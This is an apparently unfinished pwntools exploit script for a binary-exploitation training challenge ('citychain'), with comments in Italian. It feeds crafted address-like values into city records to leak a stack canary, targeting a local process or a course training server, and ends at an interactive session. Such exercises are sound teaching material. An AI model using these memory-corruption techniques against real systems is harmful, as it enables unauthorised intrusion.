from pwn import *
import time
context.update(arch='amd64', os='linux')
context.terminal = ['tmux', 'splitw', '-h']
context.log_level = 'debug'
if "REMOTE" not in args:
    p = process("./citychain")
    gdb.attach(p, """
        #b *0x400ac8
        """)
    input("wait")
else:
    p = remote("bin.training.offdef.it", 5003)


def add_city(Name,lat,long,pop,area,elev):
    p.recvuntil(b"> ")
    p.sendline(b"1")
    p.recvuntil(b"Name: ")
    p.sendline(Name)
    p.recvuntil(b"Latitude: ")
    p.sendline(lat)
    p.recvuntil(b"Longitude: ")
    p.sendline(long)
    p.recvuntil(b"Population: ")
    p.sendline(pop)
    p.recvuntil(b"[m^2]: ")
    p.sendline(area)
    p.recvuntil(b"[m]: ")
    p.sendline(elev)
    


add_city(b"roma",b"1",b"2",b"3",b"4",b"5")
add_city(b"roma",b"6",b"7",b"4198560",b"4199891",b"4210712")   


leaked_canary = b"\x00\x00" + p.recv(6)

p.recvuntil(b">")
p.sendline(b"2")

log.debug(f'Il valore di canary è: {leaked_canary}')

#leaked_canary = b"\x00\x00" + p.recv(6)
#canary = u64(leaked_canary)       # da seq di byte a intero di 8 byte 
#print("[!] leaked_canary %#x" % canary)   #lo stampa come esadecimale. # significa includere 0x
#log.debug(f'Il valore di canary è: {leaked_canary}')


p.interactive()